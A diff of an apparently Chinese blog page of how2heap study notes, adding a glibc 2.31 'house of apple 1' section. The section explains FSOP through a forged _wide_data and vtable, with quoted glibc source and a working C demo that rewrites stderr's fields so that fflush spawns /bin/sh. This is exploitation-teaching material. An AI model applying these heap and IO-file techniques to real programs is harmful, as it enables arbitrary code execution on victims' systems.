@@ -446,21 +446,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-09-24
+                    2023-10-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    15.1k
+                    16k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    80 分
+                    85 分
                 </div>
                 
 
@@ -480,6 +480,8 @@
             <div id="articleContent">
                 <p>[TOC]</p>
 <p><code>how2heap</code>源码地址：<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/tree/master">https://github.com/shellphish/how2heap/tree/master</a></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.z1r0.top/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">https://www.z1r0.top/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/19609dd.html">https://zikh26.github.io/posts/19609dd.html</a></p>
 <p>本篇去除了所有注释（太占地方啦</p>
 <h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -4184,6 +4186,146 @@ p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</
 p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
 p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc_2.31"></a>glibc_2.31</h2><p>高阶的<code>IO</code>利用，高版本中<code>__free_hook</code>、<code>__malloc_hook</code>、<code>__calloc_hook</code>都已经被取消，此时只能利用<code>IO</code></p>
+<h3 id="house-of-apple-1（large-bin-attack-fsop）"><a href="#house-of-apple-1（large-bin-attack-fsop）" class="headerlink" title="house_of_apple 1（large bin attack + fsop）"></a>house_of_apple 1（large bin attack + fsop）</h3><p><strong>条件</strong>：能够泄露<code>libc</code>和<code>heap</code>地址且程序从<code>main</code>或<code>exit</code>函数结束</p>
+<p><strong>过程</strong>：通过一次<code>large bin attack</code>劫持<code>_IO_list_all</code>替换为伪造的<code>IO_FILE</code>结构体，在程序结束的时候会遍历<code>_IO_list_all</code>中的结构体，执行结构体中的<code>vtable-&gt;overflow</code>指向的函数。其次可以利用<code>_wide_data</code>继续修改其他地方的值，在<code>_IO_FILE</code>中<code>_wide_data</code>的偏移是<code>0xa0</code></p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct _IO_FILE_complete
+&#123;
+  struct _IO_FILE _file;
+  __off64_t _offset;
+  &#x2F;* Wide character stream stuff.  *&#x2F;
+  struct _IO_codecvt *_codecvt;
+  struct _IO_wide_data *_wide_data;	&#x2F;&#x2F;***
+  struct _IO_FILE *_freeres_list;
+  void *_freeres_buf;
+  size_t __pad5;
+  int _mode;
+  &#x2F;* Make sure we don&#39;t get into trouble again.  *&#x2F;
+  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
+&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>伪造<code>_wide_data</code>中的值之后可以通过<code>_IO_wstrn_overflow</code>来将<code>overflow_buf</code>的值赋给<code>fp-&gt;_wide_data</code>，漏洞在于没有检查<code>fp-&gt;_wide_data</code>的合法性，而这两个都是可控的（通常伪造的<code>_IO_FILE</code>在堆上)，所以能够实现任意地址写</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">static wint_t
+_IO_wstrn_overflow (FILE *fp, wint_t c)
+&#123;
+  &#x2F;* When we come to here this means the user supplied buffer is
+     filled.  But since we must return the number of characters which
+     would have been written in total we must provide a buffer for
+     further use.  We can do this by writing on and on in the overflow
+     buffer in the _IO_wstrnfile structure.  *&#x2F;
+  _IO_wstrnfile *snf &#x3D; (_IO_wstrnfile *) fp;&#x2F;&#x2F;强转fp为_IO_wstrnfile类型
+ 
+  if (fp-&gt;_wide_data-&gt;_IO_buf_base !&#x3D; snf-&gt;overflow_buf)
+    &#123;
+      _IO_wsetb (fp, snf-&gt;overflow_buf,
+         snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)
+                      &#x2F; sizeof (wchar_t)), 0);&#x2F;&#x2F;有时候需要绕过
+ 
+      fp-&gt;_wide_data-&gt;_IO_write_base &#x3D; snf-&gt;overflow_buf;
+      fp-&gt;_wide_data-&gt;_IO_read_base &#x3D; snf-&gt;overflow_buf;
+      fp-&gt;_wide_data-&gt;_IO_read_ptr &#x3D; snf-&gt;overflow_buf;
+      fp-&gt;_wide_data-&gt;_IO_read_end &#x3D; (snf-&gt;overflow_buf
+                      + (sizeof (snf-&gt;overflow_buf)
+                     &#x2F; sizeof (wchar_t)));
+    &#125;
+ 
+  fp-&gt;_wide_data-&gt;_IO_write_ptr &#x3D; snf-&gt;overflow_buf;
+  fp-&gt;_wide_data-&gt;_IO_write_end &#x3D; snf-&gt;overflow_buf;
+  &#x2F;&#x2F;将_IO_write_base、_IO_read_base、_IO_read_ptr、_IO_read_end、_IO_write_ptr、_IO_write_end都赋为overflow_buf
+    
+  return c;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中,<code>overflow_buf</code>的偏移是<code>0xf0</code>即<code>vtable</code>后面，<code>_IO_wsetb</code>有时需要绕过<code>free</code></p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">void
+_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)
+&#123;
+  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))
+    free (f-&gt;_wide_data-&gt;_IO_buf_base); &#x2F;&#x2F; ***
+  f-&gt;_wide_data-&gt;_IO_buf_base &#x3D; b;
+  f-&gt;_wide_data-&gt;_IO_buf_end &#x3D; eb;
+  if (a)
+    f-&gt;_flags2 &amp;&#x3D; ~_IO_FLAGS2_USER_WBUF;
+  else
+    f-&gt;_flags2 |&#x3D; _IO_FLAGS2_USER_WBUF;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong><code>demo</code></strong></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+ 
+<span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m[!] Backdoor is called!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+ 
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">char</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] allocate two 0x200 chunks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">size_t</span> puts_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>puts<span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] puts address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> libc_base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> <span class="token number">0x84420</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] libc base address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>libc_base_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">size_t</span> _IO_2_1_stderr_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x1ed5c0</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] _IO_2_1_stderr_ address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_2_1_stderr_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token class-name">size_t</span> _IO_wstrn_jumps_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token number">0x1e8c60</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] _IO_wstrn_jumps address: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_wstrn_jumps_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token keyword">char</span> <span class="token operator">*</span>stderr2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>_IO_2_1_stderr_addr<span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 1: change stderr->_flags to 0x800"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>stderr2 <span class="token operator">=</span> <span class="token number">0x800</span><span class="token punctuation">;</span>
+ 
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 2: change stderr->_mode to 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xc0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+ 
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xd8</span><span class="token punctuation">)</span> <span class="token operator">=</span> _IO_wstrn_jumps_addr<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">;</span>
+ 
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 4: replace stderr->_wide_data with the allocated chunk p1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>stderr2 <span class="token operator">+</span> <span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>p1<span class="token punctuation">;</span>
+ 
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p1 <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>p2<span class="token punctuation">;</span>
+ 
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p1 <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token punctuation">;</span>
+ 
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 7: put backdoor at fake _wide_vtable->_overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] step 8: call fflush(stderr) to trigger backdoor func"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>说明</strong>：<code>_IO_list_all</code>中第一项就是<code>stderr</code>，首先需要满足<code>fsop</code>的要求</p>
+<blockquote>
+<p><code>_flags = 0x800</code></p>
+<p><code>_mode = 1</code></p>
+</blockquote>
+<p>接下来改<code>stderr</code>的<code>vtable</code>为<code>_IO_wstrn_jumps-0x20</code>使得<code>_IO_wstrn_jumps</code>恰好落在<code>vtable-&gt;overflow</code>函数被执行</p>
+<p>接着为了使<code>_wide_data</code>和<code>_wide_vtable</code>可控将它们改成两个堆的地址，并且在堆中伪造</p>
+<blockquote>
+<p><code>stderr-&gt;_wide_data = p1</code> </p>
+<p><code>stderr-&gt;_wide_data-&gt;_wide_vtable = p2</code></p>
+<p><code>stderr-&gt;_wide_data-&gt;_wide_vtable</code>中<code>_IO_write_ptr</code> &gt;  <code>IO_write_base</code></p>
+<p><code>_wide_vtable-&gt;_overflow = backdoor</code></p>
+</blockquote>
+<p>最后刷新<code>_IO_list_all</code>就可以调用到<code>_IO_wstrn_jumps</code>中的<code>overflow</code>函数即<code>backdoor</code></p>
 
                 
             </div>
@@ -4523,7 +4665,7 @@ p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">51.2k</span>&nbsp;字
+                class="white-color">52.1k</span>&nbsp;字
             
             
             
